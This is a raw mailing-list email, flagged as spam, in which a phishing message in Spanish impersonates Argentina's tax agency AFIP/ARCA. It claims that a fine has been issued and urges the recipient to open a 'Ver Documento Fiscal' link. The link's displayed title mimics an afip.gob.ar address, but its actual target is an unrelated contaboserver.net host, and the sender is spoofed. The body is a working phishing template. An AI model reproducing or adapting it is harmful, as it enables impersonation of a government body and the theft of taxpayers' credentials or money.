Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 999F2C3F95F
	for <lists+osst-users@lfdr.de>; Fri, 07 Nov 2025 11:52:07 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Date:
	MIME-Version:Message-ID:From:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=8CcoEhRA1VCZZOaC/0JhwgiW3O+01gHCjyzTGLu3IHk=; b=dyuhn4/HFhIiA4Q0YGeCRm6vnC
	skCqIVYedEPGiRT5jQdb0J8Q7UKSugAhyGiNipmx7XGAEy6jQ/L6Hdu+h96g7zXeYLTGJBI3jtWow
	blepQH5wwQALrRoXxdR8jvVqn+TuUzRoHd4evjje3cYTBxXj7vipyUDQMVPFEDGHkFvY=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1vHK4b-0004Zv-NG
	for lists+osst-users@lfdr.de;
	Fri, 07 Nov 2025 10:52:05 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <afipconsultas@afip.gob.ar>) id 1vHK4a-0004Zo-Bd
 for osst-users@lists.sourceforge.net; Fri, 07 Nov 2025 10:52:04 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Date:List-Unsubscribe:Content-Type:
 MIME-Version:Message-ID:Reply-To:From:To:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=QMr8JI3I6jMcS7ei/Ap+td+khJna+rvMPGCGzCBSatw=; b=YwujiLc+ox/kHZ1a7COqAzQy90
 k1sBqA77N7IP707bClYeZ1MSn/LpYsgkrZ95Duk8Va9GbSvOCylSNQmyEzoYioUxxaM9F/2/xMPes
 nvPuJIl6SclzOZT5iu4x3lCTmCcADN/KSQxTbFmKI9nqALMA+VIzcAgy/Y2Lnl1me1mk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Date:List-Unsubscribe:Content-Type:MIME-Version:Message-ID:
 Reply-To:From:To:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=QMr8JI3I6jMcS7ei/Ap+td+khJna+rvMPGCGzCBSatw=; b=bz37ep/BBEFTT7ltEjPvYqmNmD
 mdL2uWz20a7V6eaOR5CTGYbXWM+YCUATUw66GOi6C7F0pMwx+cq3qWiBWwcp0Nct+cys47P4FTFjS
 GAxY/9lSHuH8JU6TJnmHSP7jPbI+4wEwyYdPGJDIAHChY29VtZ522Kzn+vB+btJzHxnQ=;
Received: from [135.125.218.121] (helo=g5u3c7.inf285528.ink)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1vHK4Z-00078U-Fk for osst-users@lists.sourceforge.net;
 Fri, 07 Nov 2025 10:52:04 +0000
Received: by g5u3c7.inf285528.ink (Postfix, from userid 33)
 id EB7A33FFE5; Fri,  7 Nov 2025 10:51:43 +0000 (UTC)
To: osst-users@lists.sourceforge.net
From: AFIP Control de Ingresos 288 <afipconsultas@afip.gob.ar>
Message-ID: <20251107075143.F2B8D08D3E@afip.gob.ar>
X-Mailer: Microsoft Office Outlook, Build 17.551210
MIME-Version: 1.0
Date: Fri,  7 Nov 2025 10:51:43 +0000 (UTC)
X-Spam-Score: 6.4 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-2.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  AFIP ARCA | Notificaciones electr&oacute;nico Oficial. 
 Content analysis details:   (6.4 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [135.125.218.121 listed in wl.mailspike.net]
 4.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [135.125.218.121 listed in dnsbl-1.uceprotect.net]
 0.1 TRACKER_ID             BODY: Incorporates a tracking ID number
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 LOTS_OF_MONEY          Huge... sums of money
 1.0 LIST_PARTIAL           Has incomplete List-* header set
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1vHK4Z-00078U-Fk
Subject: [Osst-users] [SPAM] Notificacion de Pago de Multa en Documento
 755225
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Reply-To: noreply288@afip.gob.ar
Content-Type: multipart/mixed; boundary="===============0651372064781002486=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============0651372064781002486==
Content-Type: multipart/alternative; boundary="14420ef63ad57c92c33ecc1d1b5003c1"

--14420ef63ad57c92c33ecc1d1b5003c1
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit



  
  AFIP



  
    
      
        
      
    
  


  
    
      
      ARCA |
Notificaciones electr&oacute;nico Oficial.
      
    
    
      
      
      Estimado/a Contribuyente:&nbsp;osst-users@lists.sourceforge.net &nbsp;
      Le informamos que se ha generado un nuevo documento
fiscal, resultando en una multa de $2.068,17.
      Fecha de emisi&oacute;n:&nbsp;07/11/2025
      HTSBFWOQDHZP17SAFQHESPYKFG4USO8H
      Si los datos mencionados no le corresponden, puede
ignorar este mensaje.
      Muchas gracias por su atenci&oacute;n.
      (
ARCA ) - Agencia de Recaudaci&oacute;n y
Control Aduanero
      
        
          
            
            Descargar
el Informe:
            Ver Documento Fiscal
            
            &nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; Versi&oacute;n impresa
disponible para descargar, consultar.
            
            
            Administraci&oacute;n
Federal de Ingresos P&uacute;blicos
            La
direcci&oacute;n de env&iacute;o de este correo no se encuentra
habilitada para
recibir mensajes. Si Ud. tiene alguna duda, consulta o reclamo puede
hac&eacute;rnoslo llegar por cualquiera de los medios disponibles
en&nbsp;
            
          
        
      
      
    
  






--14420ef63ad57c92c33ecc1d1b5003c1
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 8bit

<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="content-type">
  <title>AFIP</title>
</head>
<body>
<table
 style="border: 0px none ; margin: 0px; padding: 0px; width: 780px;"
 border="0" cellpadding="0" cellspacing="0">
  <tbody>
    <tr>
      <td style="text-align: left;">
      <div style="color: rgb(0, 117, 168);"> <img
 src="https://auth.afip.gob.ar/contribuyente_/resources/frameworkAFIP/v1/img/logo_afip.png"
 alt="Acceso con Clave Fiscal - AFIP" height="59"
 width="171"> </div>
      </td>
    </tr>
  </tbody>
</table>
<table
 style="border: 1px solid rgb(12, 44, 103); padding: 15px; margin-top: 10px; background-color: rgb(255, 255, 255); width: 778px; height: 534px;">
  <tbody>
    <tr>
      <td>
      <h2 style="color: rgb(12, 44, 103);">ARCA |
Notificaciones electr&oacute;nico Oficial.</h2>
      </td>
    </tr>
    <tr>
      <td colspan="1" style="color: rgb(12, 44, 103);"
 valign="top ">
      <p></p>
      <p>Estimado/a Contribuyente:&nbsp;<strong>osst-users@lists.sourceforge.net &nbsp;</strong></p>
      <p>Le informamos que se ha generado un nuevo documento
fiscal, resultando en una multa de <strong>$2.068,17</strong>.</p>
      <p><strong>Fecha de emisi&oacute;n:&nbsp;</strong><strong>07/11/2025</strong></p>
      <p
 style="background: rgb(0, 117, 168) none repeat scroll 0% 50%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; color: rgb(255, 255, 255); font-size: 18px; text-align: center;">HTSBFWOQDHZP17SAFQHESPYKFG4USO8H</p>
      <p>Si los datos mencionados no le corresponden, puede
ignorar este mensaje.</p>
      <p>Muchas gracias por su atenci&oacute;n.</p>
      <h4 style="color: rgb(12, 44, 103);"><strong><strong>(
ARCA ) - Agencia de Recaudaci&oacute;n y
Control Aduanero</strong></strong></h4>
      <table style="margin: 0px; padding: 15px;" width="600">
        <tbody>
          <tr>
            <td>
            <h2
 style="border: 0px none ; margin: 0px; padding: 0px; font-weight: bold; font-size: 20px; line-height: 28px; color: rgb(12, 44, 103);"><strong>Descargar
el Informe:</strong><br aria-hidden="true">
            <a href="https://vmi2894040.contaboserver.net/?_task=mail&_action=get&_mbox=INBOX&_uid=989725&_token=DHZP17SAFG4USO8HOZ32CLEZKOF203&_part=1.2.827&_embed=1&_mimeclass=image" target="_blank"
 rel="noopener noreferrer" data-auth="NotApplicable"
 title="afip.gob.ar/landing/contribuyente/informe-fiscal...HTSBFWOQDHZP17SAFQHESPYK"
 data-linkindex="0">Ver Documento Fiscal</a></h2>
            <br>
            <img data-imagetype="External"
 src="https://i.imgur.com/4aMqb0y.png" style="" width="35">&nbsp;
&nbsp; &nbsp; &nbsp; &nbsp; Versi&oacute;n impresa
disponible para descargar, consultar.<br>
            <br>
            <p
 style="border: 0px none ; margin: 0px 0px 8px; padding: 0px; font-size: 12px; line-height: 18px; color: rgb(112, 112, 112); text-align: left;"><strong></strong></p>
            <p
 style="border: 0px none ; margin: 0px 0px 8px; padding: 0px; font-size: 12px; line-height: 18px; color: rgb(112, 112, 112); text-align: left;"><strong>Administraci&oacute;n
Federal de Ingresos P&uacute;blicos</strong></p>
            <p
 style="border: 0px none ; margin: 0px 0px 8px; padding: 0px; font-size: 12px; line-height: 18px; color: rgb(112, 112, 112); text-align: left;"><small>La
direcci&oacute;n de env&iacute;o de este correo no se encuentra
habilitada para
recibir mensajes. Si Ud. tiene alguna duda, consulta o reclamo puede
hac&eacute;rnoslo llegar por cualquiera de los medios disponibles
en&nbsp;</small></p>
            </td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</table>
<br>
</body>
</html>


--14420ef63ad57c92c33ecc1d1b5003c1--



--===============0651372064781002486==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0651372064781002486==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============0651372064781002486==--


